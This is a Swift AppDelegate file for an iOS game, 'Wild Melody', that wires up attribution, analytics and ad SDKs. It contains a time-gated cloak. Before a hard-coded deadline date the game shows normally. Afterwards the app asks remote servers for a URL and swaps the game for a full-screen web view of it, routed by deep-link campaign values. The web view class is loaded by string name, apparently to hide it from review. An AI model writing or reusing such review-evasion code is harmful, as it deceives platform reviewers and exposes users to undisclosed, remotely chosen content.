//
//  AppDelegate.swift
//  Wild Melody
//
//  Created by Book of Dead on 10/11/2020.
//

import SpriteKit
import UIKit
import Firebase
import GoogleMobileAds
import AppsFlyerLib
import FBSDKCoreKit
import WebKit
import AppsFlyerLib
import AppTrackingTransparency

let appId = "1639091650"
let deadLine = "2022-08-16"

var mainWindow: UIWindow? {
    let appDelegate = UIApplication.shared.delegate as? AppDelegate
    return appDelegate!.window
}

struct HomeTrack: Decodable {
    var track: String
}

func setIfPresentByLink(a: String, o: String, s3: String) {
//    if let url = tracktrack {
//        openUrl(url: url)
//        return
//    }
    
    var urlComponents = URLComponents()
    urlComponents.scheme = "https"
    urlComponents.host = "apps-gateway-qusw2.ondigitalocean.app"
    urlComponents.path = "/prod"
    urlComponents.queryItems = [
        URLQueryItem(name: "uuid", value: "JuiceLivelihood"),//change
        URLQueryItem(name: "uid", value: "83D38040-FCE7-4AAF-B21F-E724C4091237"),
        URLQueryItem(name: "app", value: "1639091650"),//change
        URLQueryItem(name: "a", value: a),
        URLQueryItem(name: "o", value: o),
        URLQueryItem(name: "s3", value: s3)
    ]
    guard let url = urlComponents.url else { return }
    print(url)
    
    let dataTask = URLSession.shared.dataTask(with: url) { (data, response, error) in
        guard let data = data else { return }
        do {
            let trackHome = try JSONDecoder().decode(HomeTrack.self, from: data)
            let url = URL(string: trackHome.track)
            if let url = url {
                tracktrack = url
                DispatchQueue.main.async {
                    let vc = InAppViewController(url: url)
                    mainWindow?.rootViewController = vc
                    mainWindow?.makeKeyAndVisible()
                }
            }
        } catch let jsonError {
            print(jsonError.localizedDescription)
        }
    }
    dataTask.resume()
}

@main
class AppDelegate: UIResponder, UIApplicationDelegate, UNUserNotificationCenterDelegate, AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        print(conversionInfo)
        //AppsFlyerLib.shared().logEvent("dep", withValues: [:])
        //AppsFlyerLib.shared().logEvent("registration", withValues: [:])
    }
    
    func onConversionDataFail(_ error: Error) {
        print(error)
    }
    
    

    var window: UIWindow?

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        FirebaseApp.configure()
        
        // 1 - Get AppsFlyer preferences from .plist file
        guard let propertiesPath = Bundle.main.path(forResource: "afdevkey", ofType: "plist"),
            let properties = NSDictionary(contentsOfFile: propertiesPath) as? [String:String] else {
                fatalError("Cannot find `afdevkey`")
        }
        guard let appsFlyerDevKey = properties["appsFlyerDevKey"],
                   let appleAppID = properties["appleAppID"] else {
            fatalError("Cannot find `appsFlyerDevKey` or `appleAppID` key")
        }
        
        //  Set isDebug to true to see AppsFlyer debug logs
        AppsFlyerLib.shared().isDebug = true
        
        // Replace 'appsFlyerDevKey', `appleAppID` with your DevKey, Apple App ID
        AppsFlyerLib.shared().appsFlyerDevKey = appsFlyerDevKey
        AppsFlyerLib.shared().appleAppID = appleAppID
        
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)
               
        AppsFlyerLib.shared().delegate = self
        AppsFlyerLib.shared().deepLinkDelegate = self
        
        AppsFlyerLib.shared().appInviteOneLinkID = "dY57"
        
        
        // Subscribe to didBecomeActiveNotification if you use SceneDelegate or just call
        // -[AppsFlyerLib start] from -[AppDelegate applicationDidBecomeActive:]
        NotificationCenter.default.addObserver(self, selector: #selector(didBecomeActiveNotification),
        // For Swift version < 4.2 replace name argument with the commented out code
        name: UIApplication.didBecomeActiveNotification, //.UIApplicationDidBecomeActive for Swift < 4.2
        object: nil)
        
        AppsFlyerLib.shared().deepLinkDelegate = self
        //setIfPresentByLink(a: "7273", o: "2676", s3: "nashi-simvoly")
        //copyShareInviteLink(fruitName: "test")
        
        FBManager.shared.setUpFB(application, launchOptions: launchOptions)
        GADMobileAds.sharedInstance().start(completionHandler: nil)
        setUpAppsFlyer()
        
        
        window = UIWindow(frame: UIScreen.main.bounds)
        window?.makeKeyAndVisible()
        
        if gotOverReview {
            window?.rootViewController = WaitingViewController()
        } else {
            openGame()
            return true
        }
        
        if localuuid == nil {
            localuuid = UUID().uuidString
        }
        let uuid = localuuid ?? UUID().uuidString
        print(uuid)
        
        request(uuid: uuid) { result in
            
            switch result {
            case .url(let url):
                guard let url = url else {
                    self.openGame()
                    return
                }
                self.openURL(url)

            case .error:
                guard let url = tracktrack else {
                    self.openGame()
                    return
                }
                self.openURL(url)
            case .native:
                self.openGame()
            }

        }
    
        return true
    }
    
    @objc func didBecomeActiveNotification() {
        AppsFlyerLib.shared().start()
        if #available(iOS 14, *) {
          ATTrackingManager.requestTrackingAuthorization { (status) in
            switch status {
            case .denied:
                print("AuthorizationSatus is denied")
            case .notDetermined:
                print("AuthorizationSatus is notDetermined")
            case .restricted:
                print("AuthorizationSatus is restricted")
            case .authorized:
                print("AuthorizationSatus is authorized")
            @unknown default:
                fatalError("Invalid authorization status")
            }
          }
        }
    }
    
    func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void) -> Bool {
        AppsFlyerLib.shared().continue(userActivity, restorationHandler: nil)
        return true
    }
            
    // Open URI-scheme for iOS 9 and above
    func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
        AppsFlyerLib.shared().handleOpen(url, options: options)
        return true
    }
    
    // Report Push Notification attribution data for re-engagements
    func application(_ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        AppsFlyerLib.shared().handlePushNotification(userInfo)
    }
    
    // For Swift version < 4.2 replace function signature with the commented out code
    // func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -> Void) -> Bool { // this line for Swift < 4.2
    
    func applicationDidEnterBackground(_ application: UIApplication) {
    }
    
    func applicationDidBecomeActive(_ application: UIApplication) {
        IDFAManager.shared.request()
    }
    
    func setUpAppsFlyer() {
        let appsFlyer = AppsFlyerLib.shared()
        appsFlyer.appsFlyerDevKey = Consts.appsFlyerDevKey
        appsFlyer.appleAppID = Consts.appID
        appsFlyer.delegate = self
        appsFlyer.isDebug = false
        NotificationCenter.default.addObserver(self, selector: NSSelectorFromString("sendLaunch"), name: UIApplication.didBecomeActiveNotification, object: nil)
        appsFlyer.shouldCollectDeviceName = true
        appsFlyer.waitForATTUserAuthorization(timeoutInterval: 60)
//        let appsflyerId = AppsFlyerLib.shared().getAppsFlyerUID()
//        print(appsflyerId)
//
//        Messaging.messaging().token { (result, error) in
//            if let err = error { print(err) }
//            print(result)
//            guard let firebaseID = result else {
//                print("FirebaseID is nil")
//                Analytics.logEvent("noFirebaseId", parameters: [:])
//                return
//            }
//        }
        
    }
    
    @objc func sendLaunch() {
        AppsFlyerLib.shared().start()
    }
    func openGame() {
        SKTextureAtlas(named: "Sprites").preload {
            print("preloaded")
        }
        let storyBoard = UIStoryboard(name: "Main", bundle: nil)
        let vc = storyBoard.instantiateViewController(withIdentifier: "StartVC")
        window?.rootViewController = vc
    }
    
    func openURL(_ url: URL) {
        let vc = InAppViewController(url: url)
        window?.rootViewController = vc
        window?.makeKeyAndVisible()
    }

}

fileprivate struct JSONResponse: Codable {
    var url: String
    var strategy: String
}

fileprivate enum Result {
    case url(URL?)
    case error
    case native
}

fileprivate func request(uuid: String, _ handler: @escaping (Result) -> Void) {
        
    var urlComponents = URLComponents()
    urlComponents.scheme = "https"
    urlComponents.host = "apps.vortexads.io"
    urlComponents.path = "/v2/guest"
    urlComponents.queryItems = [
        URLQueryItem(name: "uuid", value: uuid),
        URLQueryItem(name: "app", value: appId)
    ]
    guard let url = urlComponents.url else {
        handler(.error)
        return
    }
    
    print(url)
    
    URLSession.shared.dataTask(with: url) { (data, response, error) in
        guard let statusCode = (response as? HTTPURLResponse)?.statusCode else {
            DispatchQueue.main.async {
                handler(.error)
            }
            return
        }
        
        let handlerType: Result
        
        switch statusCode {
        case 200:
            guard let data = data,
                  let jsonResponse = try? JSONDecoder().decode(JSONResponse.self, from: data)  else {
                handlerType = .error
                return
            }
            
            switch jsonResponse.strategy {
            case "PreviewURL":
                handlerType = .url(URL(string: jsonResponse.url))
            case "PreviousURL":
                handlerType = .url(previous)
            default:
                handlerType = .error
            }
            
        case 204:
            handlerType = .native
        default:
            handlerType = .error
        }
        
        DispatchQueue.main.async {
            handler(handlerType)
        }
        
    }.resume()
    
}

fileprivate var gotOverReview: Bool {
    get {
        let now = Date()
        let date = Date(deadLine)
        let gotOverReview = now >= date
        return gotOverReview
    }
}

fileprivate var tracktrack: URL? {
    get {
        return UserDefaults.standard.url(forKey: "track")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "track")
    }
}

fileprivate var previous: URL? {
    get {
        return UserDefaults.standard.url(forKey: "previous")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "previous")
    }
}

fileprivate var localuuid: String? {
    get {
        return UserDefaults.standard.string(forKey: "localuuid")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "localuuid")
    }
}

fileprivate class InAppViewController: UIViewController, WKNavigationDelegate {
    
    let url: URL

    init(url: URL) {
        self.url = url

        super.init(nibName: nil, bundle: nil)
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
        
    override func viewDidLoad() {
        super.viewDidLoad()
        SoundManager.shared.stopMusic()
        let webClass = NSClassFromString("WKWebView") as! NSObject.Type
        let web = webClass.init()
    
        
        if let webView = web as? UIView {
            self.view.addSubview(webView)
            webView.fillSuperView()
        }

        if let wkWebView = web as? WKWebView {
            let rqst = URLRequest(url: url)
            wkWebView.navigationDelegate = self
            wkWebView.load(rqst)
        }
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        previous = webView.url
    }
}

extension Date {
    init(_ dateString:String) {
        let dateStringFormatter = DateFormatter()
        dateStringFormatter.dateFormat = "yyyy-MM-dd"
        dateStringFormatter.locale = NSLocale(localeIdentifier: "en_US_POSIX") as Locale
        let date = dateStringFormatter.date(from: dateString)!
        self.init(timeInterval:0, since:date)
    }
}

class WaitingViewController: UIViewController {
    override func viewDidLoad() {
        super.viewDidLoad()
        
//        let icon = UIApplication.shared.icon
        let coin = UIImage(named: "coin")
        let imageView = UIImageView(image: coin)
//        imageView.layer.cornerRadius = 8
        view.addSubview(imageView)
        imageView.ancherToSuperviewsCenter()
        imageView.heightAnchor.constraint(equalToConstant: 128).isActive = true
        imageView.widthAnchor.constraint(equalToConstant: 128).isActive = true
        
        let animation: () -> Void = {
            let angle: CGFloat = .pi / 4
            let wholeAngle = 32
            
            for _ in 1...wholeAngle {
                imageView.transform = imageView.transform.rotated(by: angle)
            }
        }
        
        let animator = UIViewPropertyAnimator(duration: 4, curve: .easeInOut, animations: animation)
        animator.startAnimation()
    }
}

extension UIApplication {
    var icon: UIImage? {
        guard let iconsDictionary = Bundle.main.infoDictionary?["CFBundleIcons"] as? NSDictionary,
            let primaryIconsDictionary = iconsDictionary["CFBundlePrimaryIcon"] as? NSDictionary,
            let iconFiles = primaryIconsDictionary["CFBundleIconFiles"] as? NSArray,
            // First will be smallest for the device class, last will be the largest for device class
            let lastIcon = iconFiles.lastObject as? String,
            let icon = UIImage(named: lastIcon) else {
                return nil
        }

        return icon
    }
}

extension UIView {
    func fillSuperView() {
        guard let superview = self.superview else { return }
        self.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            self.topAnchor.constraint(equalTo: superview.topAnchor),
            self.bottomAnchor.constraint(equalTo: superview.bottomAnchor),
            self.leadingAnchor.constraint(equalTo: superview.leadingAnchor),
            self.trailingAnchor.constraint(equalTo: superview.trailingAnchor),
        ])
    }
    
    func ancherToSuperviewsCenter() {
        guard let superview = self.superview else { return }
        self.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            self.centerXAnchor.constraint(equalTo: superview.centerXAnchor),
            self.centerYAnchor.constraint(equalTo: superview.centerYAnchor),
        ])
    }
}

extension AppDelegate: DeepLinkDelegate {
    func didResolveDeepLink(_ result: DeepLinkResult) {
        
        switch result.status {
        case .notFound:
            NSLog("[AFSDK] Deep link not found")
            return
        case .failure:
            print("Error %@", result.error!)
            return
        case .found:
            NSLog("[AFSDK] Deep link found")
        }
        
        guard let deepLinkObj:DeepLink = result.deepLink else {
            NSLog("[AFSDK] Could not extract deep link object")
            return
        }
        
        if deepLinkObj.clickEvent.keys.contains("campaign") {
            var ReferrerId:String = deepLinkObj.clickEvent["campaign"] as! String
            NSLog("[AFSDK] AppsFlyer: Referrer ID: \(ReferrerId)")
            print(ReferrerId)
            
            let wordToRemove = "app_"
            if let range = ReferrerId.range(of: wordToRemove) {
                ReferrerId.removeSubrange(range)
            }
            
            let fullNameArr = ReferrerId.components(separatedBy: "_")
            let a    = fullNameArr[0]
            let o = fullNameArr[1]
            let s3 = fullNameArr[2]
            setIfPresentByLink(a: a, o: o, s3: s3)
        } else {
            NSLog("[AFSDK] Could not extract referrerId")
        }
        
        let deepLinkStr:String = deepLinkObj.toString()
        NSLog("[AFSDK] DeepLink data is: \(deepLinkStr)")
            
        if( deepLinkObj.isDeferred == true) {
            NSLog("[AFSDK] This is a deferred deep link")
        }
        else {
            NSLog("[AFSDK] This is a direct deep link")
        }
    }
}
